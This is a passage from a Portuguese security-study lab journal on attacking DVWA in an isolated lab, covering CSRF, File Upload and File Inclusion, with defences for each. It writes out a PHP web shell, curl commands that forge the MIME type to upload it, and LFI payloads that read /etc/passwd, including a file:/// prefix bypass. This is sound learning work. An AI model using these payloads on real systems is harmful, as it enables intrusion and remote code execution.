- [ ] CSRF nível Impossible (já sabemos, de um erro anterior nesta sessão, que usa tokens anti-CSRF)

---

## Entrada #36 — CSRF (nível Impossible) — fecha o módulo CSRF

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o CSRF contra a defesa de nível Impossible, fechando o módulo. Sessão marcada por um percurso de troubleshooting longo, documentado com honestidade.

### Ação executada (resumo do percurso, incluindo os enganos)

1. Primeira tentativa: ataque via `<img>` "funcionou" (login com a password nova teve sucesso) — resultado surpreendente e suspeito, contrário ao padrão esperado do Impossible.
2. Investigação revelou que o resultado estava **contaminado**: o campo "Current password" do formulário estava a ser preenchido automaticamente pelo gestor de passwords do Firefox com uma password antiga guardada (da primeira password comprida gerada na Entrada #33, nunca anotada), causando confusão nos testes e mensagens de erro ("Passwords did not match or current password incorrect").
3. **Reposição do ambiente:** usado "Setup / Reset DB" para repor a base de dados do DVWA (`admin` / `password`), e removidas as passwords guardadas no Firefox (`about:logins`) para este site.
4. **Teste limpo, repetido:** DVWA Security confirmado em Impossible. Ficheiro `csrf_attack6.html` criado, com `<img>` a apontar para o URL de mudança de password (`impossivelfinal2026`), sem tocar em nenhum formulário oficial antes do teste.
5. Ficheiro aberto no Firefox, logout, tentativa de login com `impossivelfinal2026` → **"Login failed"**. Tentativa de login com `password` (a base do reset) → **sucesso**.

### Resultado

Confirmado, com um ambiente limpo: o CSRF **não funcionou** no nível Impossible — a password nunca mudou. É a primeira vez, neste módulo, que uma defesa resiste de verdade ao ataque, confirmando o padrão já visto nos outros módulos: o Impossible resolve a causa raiz. Aqui, através de **tokens anti-CSRF** (confirmado antes, por engano, pela mensagem "CSRF token is incorrect" ao testar sem token válido).

### Deduções e raciocínio (certos e corrigidos)

- **Falso positivo identificado e corrigido:** o primeiro resultado ("ataque funcionou no Impossible") estava errado, por contaminação do ambiente de teste (autofill do browser), não por falha real da defesa. Só foi possível perceber isto ao questionar o resultado surpreendente em vez de o aceitar sem mais.
- **Lição de metodologia, não só de segurança:** um ambiente de teste "sujo" (passwords antigas guardadas, estado da base de dados incerto) pode gerar conclusões erradas sobre uma vulnerabilidade — tão importante quanto perceber o ataque em si é garantir que o teste está a medir o que se pensa que está a medir. Isto teve custo real: várias trocas de mensagens confusas e cansaço acumulado antes de se perceber o problema.
- **Reconhecimento pessoal, registado com honestidade:** esta sessão foi longa e o cansaço afetou a clareza da comunicação, dos dois lados — instruções demasiado condensadas geraram mais confusão. Vale a pena, em sessões futuras, dar instruções mais detalhadas desde o início quando o cansaço já se faz sentir, em vez de as compactar.

**Consigo explicar isto a alguém?**
  Porque é que o primeiro teste deu um resultado enganador, e como o ambiente de teste (passwords guardadas, estado da BD) pode distorcer conclusões: **Sim**.

### Como nos podemos defender

- **CSRF tokens**, confirmados como defesa eficaz: um valor secreto, verificado a cada pedido, que o atacante não consegue incluir a partir de fora do site.
- Reforço: verificar sempre a password atual antes de aceitar uma mudança sensível (o Impossible reintroduziu o campo "Current password", que o Medium/High tinham dispensado).

### Balanço do módulo CSRF (Low → Impossible)

Módulo CSRF fechado nesta sessão (2026-08-15): Low e Medium sem defesa eficaz (Entradas #33, #34); High com bypass via ausência de cabeçalho Referer (Entrada #35); Impossible resistente, através de tokens anti-CSRF e verificação da password atual (Entrada #36). Consolidação completa em [`guias-estudo/guia-estudo-csrf.md`](./guias-estudo/guia-estudo-csrf.md).

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo CSRF (Entradas #33-36)

O CSRF não precisa de roubar uma password para causar dano — força silenciosamente qualquer ação que a vítima esteja autorizada a fazer (mudar a password, transferir fundos, alterar permissões, apagar dados), bastando que a vítima visite uma página maliciosa enquanto tem uma sessão ativa noutro separador. Numa pequena/média empresa, se a vítima for o próprio dono/administrador do negócio (a navegar normalmente, com uma sessão aberta ao painel do seu site), uma única visita a uma página maliciosa pode entregar o controlo total do site sem que ele perceba como. Numa empresa grande, ataques deste tipo em contextos bancários já causaram transferências de fundos reais não autorizadas — à escala, mesmo uma taxa de sucesso pequena contra milhares de clientes soma-se a perdas financeiras e escrutínio regulatório significativos.

### Domínios relacionados

- **Security+ — D2 / D4:** tokens anti-CSRF como controlo eficaz
- **CEH — D5 (Web Application Hacking):** importância de validar resultados de teste, evitar falsos positivos por contaminação do ambiente
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] File Upload, File Inclusion, Brute Force — para fechar oficialmente a Fase 2
- [ ] Resolver o acesso ao DevTools do Firefox no Kali (pendente da Entrada #30)

---

## Entrada #37 — File Upload (nível Low)

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Primeira exploração do módulo **File Upload** do DVWA — perceber como um upload sem validação de tipo de ficheiro pode resultar em RCE (Remote Code Execution) direto, através de uma web shell.

### Ação executada

1. DVWA Security → Low. Módulo **File Upload** — formulário simples "Choose an image to upload" (Browse + Upload).
2. **Web shell criada** no Kali:
   ```
   echo '<?php system($_GET["cmd"]); ?>' > ~/shell.php
   ```
3. Upload do `shell.php` através do formulário → confirmado: `../../hackable/uploads/shell.php succesfully uploaded!`
4. **Execução:** visitado o URL do ficheiro carregado, com um comando no parâmetro `cmd`:
   ```
   http://192.168.10.101/hackable/uploads/shell.php?cmd=whoami
   ```

### Resultado

A página devolveu `www-data` — o mesmo utilizador já identificado no Command Injection (Entrada #17). Confirma RCE completo: o servidor aceitou o ficheiro `.php` sem qualquer verificação, guardou-o numa pasta acessível pelo browser, e executou-o como código ao ser visitado — dando controlo para correr **qualquer** comando do sistema operativo através do parâmetro `cmd`.

### Deduções e raciocínio (certos e corrigidos)

- **Intuição inicial insuficiente:** a minha primeira ideia foi que o ficheiro seria "intercetado ou visto" antes de causar dano — não percebi, sem ajuda, que o problema real é o servidor **executar** o `.php` como código ao ser aberto no browser, e não apenas "guardá-lo". Só ficou claro com a explicação direta e a analogia da receção de encomendas (um cacifo que aceita um embrulho sem o verificar, que liberta controlo do edifício ao ser aberto).
- **Ligação a conceitos já conhecidos:** o resultado (`www-data`) e o mecanismo de execução de comandos via parâmetro (`?cmd=`) são, na prática, o mesmo RCE do Command Injection — só muda o canal de entrada (um ficheiro carregado, em vez de um campo de texto).

**Consigo explicar isto a alguém?**
  Porque é que um upload sem validação de tipo de ficheiro pode dar controlo total do servidor: **Sim**, com ajuda da analogia da receção de encomendas — mas a intuição inicial (antes da explicação) estava errada.

### Como nos podemos defender

- **Validação do tipo de ficheiro no servidor** (nunca confiar só na extensão ou no nome — verificar o conteúdo real do ficheiro).
- **Whitelist de extensões permitidas** (ex.: só `.jpg`, `.png`, `.gif`), rejeitando tudo o resto.
- **Guardar os ficheiros carregados fora da pasta acessível pelo browser**, ou impedir a execução de scripts nessa pasta (ex.: configuração do servidor web a bloquear execução de PHP em `uploads/`).
- **Renomear os ficheiros** ao guardá-los (nomes aleatórios), dificultando adivinhar o URL.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de input em uploads; RCE via ficheiros maliciosos
- **CEH — D5 (Web Application Hacking):** web shells como técnica clássica de pós-exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] File Upload nível Medium → Impossible

---

## Entrada #38 — File Upload (nível Medium)

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Upload contra a defesa de nível Medium e contornar a verificação de MIME type.

### Ação executada

1. DVWA Security → Medium. Upload do `shell.php` pelo formulário normal → **bloqueado**: "Your image was not uploaded. We can only accept JPEG or PNG images."
2. **Diagnóstico:** o Medium verifica o `Content-Type` (MIME type) enviado com o ficheiro, aceitando só `image/jpeg` ou `image/png` — um valor controlado pelo atacante, não uma verificação do conteúdo real.
3. **Nota lateral:** confirmado, via DevTools → Storage → Cookies, o mesmo padrão de cookies `security` duplicadas já visto nas Entradas #13 e #20 (uma com `low`, path mais específico; outra com `medium`, path `/`). Não impediu o teste, mas fica registado. **O DevTools do Firefox respondeu normalmente desta vez** (painel Storage), ao contrário da falha da Entrada #30 — resolve, pelo menos parcialmente, essa pendência.
4. **Bypass**, via `curl`, forjando o `Content-Type` do ficheiro:
   ```
   curl -F "MAX_FILE_SIZE=100000" -F "uploaded=@/home/pedro/shell.php;type=image/jpeg" -F "Upload=Upload" -b "PHPSESSID=...; security=medium" "http://192.168.10.101/vulnerabilities/upload/#"
   ```
5. **Verificação:** `http://192.168.10.101/hackable/uploads/shell.php?cmd=whoami`

### Resultado

Upload aceite via `curl` (`succesfully uploaded!`), apesar de ser exatamente o mesmo ficheiro `.php` rejeitado pelo formulário — a única diferença foi o `Content-Type` forjado. RCE confirmado novamente: `www-data`.

### Deduções e raciocínio (certos e corrigidos)

- **Reconhecimento do padrão:** identifiquei corretamente que o MIME type, sendo enviado pelo cliente, é um dado não fiável — mesma lógica de "nunca confiar em dados que o atacante controla" já vista nos módulos anteriores.
- **Ferramenta já familiar, aplicada a um novo contexto:** o uso de `curl` com cookies para contornar uma defesa do lado do cliente replica a técnica da Entrada #13 (SQL Injection Medium), agora aplicada a upload de ficheiros.

**Consigo explicar isto a alguém?**
  Porque é que verificar o MIME type não é suficiente, e como o `curl` permite forjá-lo: **Sim**.

### Como nos podemos defender

- **Nunca confiar no MIME type enviado pelo cliente** — verificar o conteúdo real do ficheiro no servidor (ex.: assinatura binária/magic bytes).
- Reforços já identificados no guia: whitelist de extensões, guardar fora da pasta executável, renomear ficheiros.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de dados controlados pelo cliente (MIME type, headers)
- **CEH — D5 (Web Application Hacking):** bypass de filtros de upload via manipulação de request (curl/Burp)

### Próximos passos

- [ ] File Upload nível High → Impossible

---

## Entrada #39 — File Upload (nível High) — resultado parcial

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Upload contra a defesa de nível High e o bypass já usado no Medium (MIME type forjado).

### Ação executada

1. DVWA Security → High.
2. **Teste 1 (curl):** criado `shell2.php` (ficheiro novo, nunca testado antes) e submetido com o mesmo `Content-Type: image/jpeg` forjado que funcionou no Medium.
3. **Teste 2 (browser):** o mesmo `shell2.php` submetido através do formulário normal do DVWA.

### Resultado

**Ambos os testes falharam**, com a mesma mensagem: "Your image was not uploaded. We can only accept JPEG or PNG images." — texto idêntico ao do bloqueio no Medium, o que inicialmente gerou confusão (a mensagem de erro não distingue os níveis; a prova real está em **o que passa ou não**, não no texto do erro).

**Nota de verificação importante:** um teste inicial no browser, à URL `hackable/uploads/shell.php?cmd=whoami`, mostrou `www-data` — mas esse era o ficheiro **antigo**, carregado durante o teste do Medium (Entrada #38), que continua acessível independentemente do nível de segurança atual (o nível só controla o que é aceite num *novo* upload, não revoga ficheiros já guardados). Não prova nada sobre o High. O teste válido foi feito com `shell2.php`, ficheiro novo, testado especificamente neste nível.

O High provavelmente verifica, além do MIME type, a **extensão do nome do ficheiro** e/ou o **conteúdo real** (função tipo `getimagesize()`, que confirma que o ficheiro é mesmo uma imagem válida) — não confirmado ao detalhe do código, mas consistente com o comportamento observado.

### Deduções e raciocínio (certos e corrigidos)

- **Correção de um mal-entendido:** confundi inicialmente o resultado de um ficheiro antigo (ainda acessível) com uma prova de que o bypass funcionava no High. Corrigido ao questionar a fonte exata do resultado — reforça a lição, já vista noutros módulos, de sempre confirmar com um teste limpo e novo antes de tirar conclusões.
- **Observação comparativa entre módulos (registada no guia comparativo):** ao contrário do SQL Injection e do XSS, onde o salto de Medium para High foi sempre um reforço do **mesmo tipo** de filtro (mais casos cobertos, mesmo método de ataque), aqui o salto é uma mudança de **categoria**: o bypass do Medium (um comando `curl`) deixa de servir por completo, e um compromisso total do High parece exigir encadear **outra vulnerabilidade** (File Inclusion), não just mais esforço no mesmo ataque.

**Consigo explicar isto a alguém?**
  Que a mensagem de erro idêntica entre Medium e High não significa que a defesa seja igual — a prova está no que se consegue ou não contornar: **Sim**.
  A diferença entre "mais um degrau da mesma escada" (SQLi/XSS) e "mudar de escada por completo" (File Upload High): **Sim**.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de conteúdo real vs. apenas metadados (MIME type, extensão)
- **CEH — D5 (Web Application Hacking):** encadeamento de vulnerabilidades (File Upload + File Inclusion) para RCE completo

### Próximos passos

- [ ] Módulo **File Inclusion** — necessário para fechar o compromisso completo do File Upload High
- [ ] File Upload nível Impossible

---

## Entrada #40 — File Upload (nível Impossible) — fecha o File Upload por hoje

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Upload contra a defesa de nível Impossible.

### Ação executada

1. DVWA Security → Impossible. Ficheiro novo `shell3.php` criado para o teste.
2. **Primeira tentativa** via `curl`, com `Content-Type` forjado (igual ao Medium/High) → `HTTP/1.1 302 Found`, redirecionado para `index.php`, sem processar o upload.
3. **Diagnóstico:** o Impossible exige um **token anti-CSRF** (`user_token`) embutido no formulário, que o pedido inicial não incluía — o mesmo mecanismo de defesa já visto no CSRF Impossible (Entrada #36), agora também presente neste módulo.
4. **Extração do token**, via `curl` + `grep`, e reenvio do pedido com o token incluído:
   ```
   curl -s -b "PHPSESSID=...; security=impossible" ".../upload/" | grep -oP "user_token' value='\K[a-f0-9]+"
   curl -i -F "uploaded=@shell3.php;type=image/jpeg" -F "user_token=<valor>" -F "Upload=Upload" -b "..." ".../upload/#"
   ```

### Resultado

Com o token válido incluído, o pedido foi processado (deixou de dar redirect) — mas o upload continuou **bloqueado**: "Your image was not uploaded. We can only accept JPEG or PNG images." Mesmo resultado do High, mais a camada extra do token anti-CSRF. Confirma que o Impossible resiste ao mesmo bypass que falhou no High, e acrescenta uma defesa adicional que nem chega a avaliar o ficheiro sem o token correto.

### Deduções e raciocínio (certos e corrigidos)

- **Padrão reconhecido de outro módulo:** o token anti-CSRF aqui é a mesma técnica já vista no CSRF Impossible — reforça que esta defesa (valor secreto, gerado pelo servidor, obrigatório em cada pedido) é uma prática transversal, não exclusiva de um módulo.
- **Persistência a resolver um obstáculo técnico:** o primeiro sinal (302, sem mensagem de erro visível) podia ter sido mal interpretado como "falha do comando" — foi preciso usar `-i` para ver os cabeçalhos e perceber a causa real (falta de token), replicando o hábito já estabelecido de diagnosticar antes de desistir ou assumir.

**Consigo explicar isto a alguém?**
  Que um `302 Found` sem corpo de resposta pode ser sinal de uma defesa (token em falta), e como diagnosticar isso com `curl -i`: **Sim**.

### Balanço do módulo File Upload (Low → Impossible, com pendência)

Low e Medium totalmente comprometidos (RCE direto). High e Impossible resistem ao bypass de MIME type — o Impossible acrescenta ainda um token anti-CSRF. Um compromisso completo de High/Impossible fica pendente de um encadeamento com o módulo **File Inclusion**, ainda por explorar. Consolidação em [`guias-estudo/guia-estudo-file-upload.md`](./guias-estudo/guia-estudo-file-upload.md).

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo File Upload isolado (Entradas #37-40)

Upload de ficheiros é um dos alvos de maior valor para um atacante, porque o sucesso costuma significar execução de código, não só exposição de dados. Numa pequena/média empresa, é comum não existir isolamento dedicado para uploads (os ficheiros são muitas vezes servidos diretamente a partir da raiz do próprio site), tornando este ponto único de falha equivalente a comprometer o servidor inteiro. Numa empresa grande, os uploads são mais frequentemente isolados num serviço de armazenamento ou CDN separado, sem permissões de execução — o que reduz o raio de impacto mesmo quando a validação em si não é perfeita.

### Domínios relacionados

- **Security+ — D2 / D4:** tokens anti-CSRF como defesa transversal a vários tipos de formulário
- **CEH — D5 (Web Application Hacking):** diagnóstico de respostas HTTP (códigos de estado, cabeçalhos) para perceber defesas não visíveis na página

### Próximos passos

- [ ] Módulo **File Inclusion**
- [ ] Voltar ao File Upload High/Impossible depois, para tentar o compromisso completo encadeado
- [ ] Brute Force — último módulo da Fase 2

---

## Entrada #41 — File Inclusion (nível Low) — LFI confirmado

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Abrir o módulo File Inclusion, testando o nível Low para confirmar Local File Inclusion (LFI) — módulo necessário também para desbloquear o encadeamento pendente com File Upload High/Impossible (Entradas #39–#40).

### Ação executada

1. **Diagnóstico prévio (fora do DVWA):** a VM Kali tinha perdido a rede do lab, voltando à rede de casa (`192.168.1.0/24`) — mesmo problema recorrente já registado antes. Corrigido reconfigurando o adaptador de rede da VM para o LAN Segment do lab e renovando o DHCP (`sudo dhclient -r eth0 && sudo dhclient eth0`), confirmando IP `192.168.10.102` via `ip a`.
2. Sessão do DVWA tinha expirado entretanto — novo login com as credenciais por defeito (`admin` / `password`, sem alterações à password).
3. DVWA Security → Low. Módulo **File Inclusion** aberto.
4. **Teste 1 — path traversal relativo**, via browser e depois confirmado via `curl`:
   ```
   http://192.168.10.101/vulnerabilities/fi/?page=../../../../etc/passwd
   ```
5. **Teste 2 — caminho absoluto**, via `curl`:
   ```
   curl -s -b "PHPSESSID=...; security=low" "http://192.168.10.101/vulnerabilities/fi/?page=/etc/passwd"
   ```

### Resultado

O traversal relativo (`../../../../etc/passwd`) **falhou**: página carregou normalmente, mas `<div id="main_body"><br /><br /></div>` — completamente vazio, sem qualquer aviso PHP visível. O caminho absoluto (`/etc/passwd`) **funcionou de imediato**: conteúdo completo do ficheiro devolvido — mas impresso **antes do próprio `<!DOCTYPE html>`** da página, não dentro do corpo. LFI confirmado no nível Low.

**Verificação adicional de RFI (Remote File Inclusion):** consultada a página **PHP Info** do DVWA — `allow_url_include` está **`Off`**, tanto em *Local Value* como em *Master Value*. Isto significa que o motor PHP recusa incluir URLs remotas neste servidor, independentemente de a aplicação validar ou não o parâmetro `page`: o RFI está bloqueado ao nível do ambiente, não é uma defesa da aplicação. Não é possível testar RFI neste container — pendência fechada por limitação do ambiente, não por resistência do DVWA.

### Deduções e raciocínio (certos e corrigidos)

- **Correção de assunção inicial:** esperava que o traversal relativo funcionasse por defeito (padrão visto noutros materiais de estudo sobre DVWA). O falhanço não é uma defesa do Low (que não valida nada) — é só a profundidade real de pastas deste container Docker não corresponder ao número de `../` usado. Um caminho absoluto elimina essa incerteza e é o teste mais fiável para confirmar a vulnerabilidade em si.
- **Padrão técnico novo face aos módulos anteriores:** o conteúdo do ficheiro incluído aparece *antes* do HTML da página — sinal de que o `include($_GET['page'])` corre logo no início do script, antes de qualquer output da página ser gerado. Em todos os módulos anteriores (SQLi, XSS, Command Injection, CSRF, File Upload) o resultado do ataque aparecia sempre dentro do corpo da página renderizada.

**Consigo explicar isto a alguém?**
  Porque é que o traversal relativo falhou mas o caminho absoluto funcionou, sem isso ser uma defesa: **Sim**.
  Porque é que o conteúdo aparece antes do `<!DOCTYPE html>`: **Sim**.

### Como nos podemos defender

- Nunca usar um parâmetro controlado pelo utilizador diretamente como caminho de ficheiro num `include()`/`require()`.
- **Whitelist** de valores permitidos para `page` (só aceitar nomes de ficheiro fixos e conhecidos, nunca o caminho literal vindo do pedido).
- Desativar `allow_url_include` no PHP (previne RFI) e restringir `open_basedir`, limitando que ficheiros o PHP consegue mesmo ler, independentemente do caminho pedido.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de entrada; princípio do menor privilégio no acesso a ficheiros do sistema
- **CEH — D5 (Web Application Hacking):** LFI, leitura arbitrária de ficheiros do servidor

### Próximos passos

- [x] RFI verificado — `allow_url_include` está `Off` (Local e Master); RFI **não é possível** neste servidor, bloqueado ao nível do PHP, não da aplicação
- [ ] File Inclusion nível Medium
- [ ] Voltar ao encadeamento File Upload + File Inclusion, para tentar o compromisso completo do High/Impossible
- [ ] Módulo Brute Force — último módulo da Fase 2

---

## Entrada #42 — File Inclusion (nível Medium) — mesmo resultado do Low

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Inclusion no nível Medium, repetindo o payload de caminho absoluto que funcionou no Low, para perceber que filtro (se algum) o Medium acrescenta.

### Ação executada

1. DVWA Security → Medium.
2. Repetição do mesmo payload via `curl`, agora com `security=medium`:
   ```
   curl -s -b "PHPSESSID=...; security=medium" "http://192.168.10.101/vulnerabilities/fi/?page=/etc/passwd"
   ```

### Resultado

Resposta **idêntica** à do Low: conteúdo completo de `/etc/passwd` devolvido, impresso antes do `<!DOCTYPE html>`, com "Security Level: medium" confirmado no rodapé da página. Nenhuma restrição adicional face ao Low, para este payload em concreto.

### Deduções e raciocínio (certos e corrigidos)

- **Padrão de filtro identificado (consistente com o comportamento típico do DVWA):** o Medium deste módulo tipicamente remove apenas as strings `"http://"` e `"https://"` do valor de `page` — um filtro pensado para mitigar **RFI**, não LFI. O nosso payload é um caminho absoluto local, sem nenhum desses prefixos, por isso passa incólume. Não é "o Medium ser mais fraco do que devia" — é o filtro visar um tipo de ataque diferente do que estamos a usar.
- **Consequência para o RFI:** como `allow_url_include` está `Off` ao nível do PHP (definição global do servidor, não do DVWA — Entrada #41), o RFI continua impossível neste nível e em todos os seguintes; não é necessário repetir esse teste a cada nível de segurança.

**Consigo explicar isto a alguém?**
  Porque é que um payload de caminho absoluto passa sem alterações por um filtro pensado para RFI: **Sim**.

### Como nos podemos defender

- Mesmas defesas já identificadas no Low (whitelist de valores para `page`, nunca o caminho literal).
- **Reforço específico deste caso:** remover substrings específicas (`"http://"`, `"https://"`) é uma blacklist ingénua — protege só contra o padrão exato previsto, não contra a causa raiz (aceitar um caminho de ficheiro arbitrário). Mesmo princípio já visto no Command Injection Medium/High: bloquear texto não substitui validar o valor inteiro contra uma whitelist.

### Domínios relacionados

- **Security+ — D2 / D4:** blacklist vs. whitelist como estratégias de validação de entrada
- **CEH — D5 (Web Application Hacking):** filtros de mitigação parcial (visam um vetor específico, RFI) que não cobrem vetores relacionados (LFI)

### Próximos passos

- [ ] File Inclusion nível High
- [ ] File Inclusion nível Impossible
- [ ] Voltar ao encadeamento File Upload + File Inclusion

---

## Entrada #43 — File Inclusion (nível High) — bypass via wrapper `file://`

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Inclusion no nível High, cuja defesa é qualitativamente diferente das anteriores (não é blacklist de texto), e tentar contorná-la.

### Ação executada

1. DVWA Security → High.
2. **Teste 1 (baseline):** repetição do payload absoluto que funcionou no Low/Medium:
   ```
   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/fi/?page=/etc/passwd"
   ```
   → **bloqueado**: `ERROR: File not found!`
3. **Diagnóstico:** o High tipicamente usa `fnmatch("file*", $page)` — só aceita valores cuja *string* comece literalmente por `"file"` (ex.: `file1.php`, `file2.php`, `file3.php`) ou seja exatamente `"include.php"`. Já não é uma blacklist de substrings perigosas (como o Medium) — é uma verificação de prefixo do texto.
4. **Bypass:** o wrapper de stream do PHP `file://` também começa pela string `"file"` — o mesmo teste de prefixo que aceita `file1.php` aceita também `file://`, mesmo sendo semanticamente outra coisa (um protocolo, não um nome de ficheiro). Testado:
   ```
   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/fi/?page=file:///etc/passwd"
   ```
   (três `/` — dois do protocolo `file://` mais o primeiro `/` do caminho absoluto)

### Resultado

O caminho absoluto puro (`/etc/passwd`) foi **bloqueado**. O mesmo caminho, prefixado com o wrapper `file://` (`file:///etc/passwd`), **funcionou de imediato** — conteúdo completo do `/etc/passwd` devolvido, impresso antes do `<!DOCTYPE html>`, "Security Level: high" confirmado no rodapé. High **comprometido por completo**, via confusão de prefixo.

### Deduções e raciocínio (certos e corrigidos)

- **Identificação correta do tipo de defesa antes de atacar:** ao ver `ERROR: File not found!` (mensagem nova, distinta do bloqueio silencioso do Low e da ausência de filtro do Medium), reconheci que era um tipo de validação diferente — não bastava um caminho diferente, era preciso perceber a lógica exata da verificação antes de tentar contornar.
- **Bypass por confusão de prefixo:** uma verificação `fnmatch("file*", ...)` testa literalmente os primeiros carateres da string, sem perceber que `"file"` também é o início válido de um **wrapper de protocolo** do PHP (`file://`), que tem semântica completamente diferente de um nome de ficheiro. É o mesmo princípio de falha já visto no MIME type (Entrada #38) e nos filtros de blacklist (Command Injection): validar **a forma/aparência** de um valor, sem entender **o que ele realmente representa** para o interpretador por trás.

**Consigo explicar isto a alguém?**
  Porque é que uma verificação `fnmatch("file*", ...)` pensada para só aceitar `file1.php`, `file2.php`, etc., deixa passar `file:///etc/passwd`: **Sim**.
  A ligação a outras falhas já vistas (validar aparência do texto, não o significado real do valor): **Sim**.

### Como nos podemos defender

- Nunca validar caminhos de ficheiro por **prefixo de string** (`fnmatch`, `strpos`, etc.) — usar sempre uma **whitelist por igualdade exata** (`in_array($page, ['file1.php','file2.php','file3.php'], true)`).
- Resolver o caminho com `realpath()` e confirmar que o resultado fica **dentro** do diretório esperado, antes de o incluir — isto invalida automaticamente qualquer wrapper de protocolo ou traversal.
- Especificamente contra wrappers PHP: restringir com `stream_wrapper_restrict` ou, mais simples, nunca passar entrada do utilizador diretamente para `include()`/`require()` — usar sempre um mapeamento indireto (ex.: um `switch` ou array associativo de chaves conhecidas para caminhos fixos).

### Domínios relacionados

- **Security+ — D2 / D4:** validação por whitelist exata vs. verificação de padrão/prefixo; canonicalização de caminhos (`realpath`)
- **CEH — D5 (Web Application Hacking):** bypass de filtros via wrappers de protocolo PHP (`file://`, `php://`, `data://`)

### Próximos passos

- [ ] File Inclusion nível Impossible
- [ ] Voltar ao encadeamento File Upload + File Inclusion

---

## Entrada #44 — File Inclusion (nível Impossible) — fecha o módulo File Inclusion

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Inclusion contra a defesa de nível Impossible, tentando o mesmo bypass que comprometeu o High.

### Ação executada

1. DVWA Security → Impossible.
2. **Teste 1 — repetição do bypass do High**, via `curl`:
   ```
   curl -s -b "PHPSESSID=...; security=impossible" "http://192.168.10.101/vulnerabilities/fi/?page=file:///etc/passwd"
   ```
3. **Teste 2 — confirmação com um valor legítimo da própria aplicação** (para distinguir "bloqueio total" de "whitelist seletiva"):
   ```
   curl -s -b "PHPSESSID=...; security=impossible" "http://192.168.10.101/vulnerabilities/fi/?page=file1.php"
   ```

### Resultado

O bypass `file:///etc/passwd`, que tinha funcionado no High, foi **bloqueado**: `ERROR: File not found!` — mesma mensagem do bloqueio inicial do High, mas agora também aplicada ao wrapper `file://`. O valor legítimo `file1.php` **funcionou normalmente**, devolvendo o conteúdo esperado da aplicação ("File 1", IP do utilizador) dentro do corpo normal da página — confirmando que não é um bloqueio total do módulo, é uma **whitelist seletiva**: só passam os valores que a aplicação realmente espera.

### Deduções e raciocínio (certos e corrigidos)

- **Distinção entre "validação de prefixo" (High) e "whitelist exata" (Impossible):** o High usava `fnmatch("file*", ...)`, testando só o início da string — por isso `file://` (que também começa por "file") passava. O Impossible parece comparar o valor recebido por **igualdade exata** contra um conjunto fixo de valores esperados (`include.php`, `file1.php`, `file2.php`, `file3.php`), rejeitando tudo o resto — incluindo qualquer wrapper de protocolo, por mais criativo que seja o prefixo.
- **Metodologia reforçada:** testar um valor legítimo a par do payload de ataque (não só "o ataque falhou", mas "a funcionalidade normal continua a funcionar") foi importante para confirmar que a defesa é seletiva e não um bloqueio genérico do módulo — mesmo raciocínio de rigor já aplicado nas Entradas #38/#39 ao distinguir ficheiros novos de antigos.

**Consigo explicar isto a alguém?**
  Diferença entre a defesa do High (verificação de prefixo, contornável) e a do Impossible (whitelist por igualdade exata, não contornável por wrappers): **Sim**.

### Como nos podemos defender

- Confirma, na prática, a recomendação já registada no guia: **whitelist por igualdade exata** (`in_array($page, [...], true)`), nunca verificação de prefixo/padrão.
- Esta é a mesma lição geral já vista repetidamente no laboratório (CSRF Impossible, File Upload Impossible): a defesa mais robusta não é "adicionar mais uma regra" a um filtro de blacklist, é mudar a abordagem para validação positiva (só aceitar o que é explicitamente permitido).

### Balanço do módulo File Inclusion (Low → Impossible)

Low e Medium totalmente comprometidos com um caminho absoluto simples (LFI direto). High comprometido via bypass do wrapper `file://` (confusão de prefixo). Impossible resistiu por completo, com whitelist exata que rejeita qualquer valor fora do conjunto esperado pela aplicação — incluindo o bypass que tinha funcionado no High. RFI confirmado como impossível em todos os níveis, por definição global do PHP (`allow_url_include` `Off`). Módulo fechado. Consolidação em [`guias-estudo/guia-estudo-file-inclusion.md`](./guias-estudo/guia-estudo-file-inclusion.md).

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo File Inclusion isolado (Entradas #41-44)

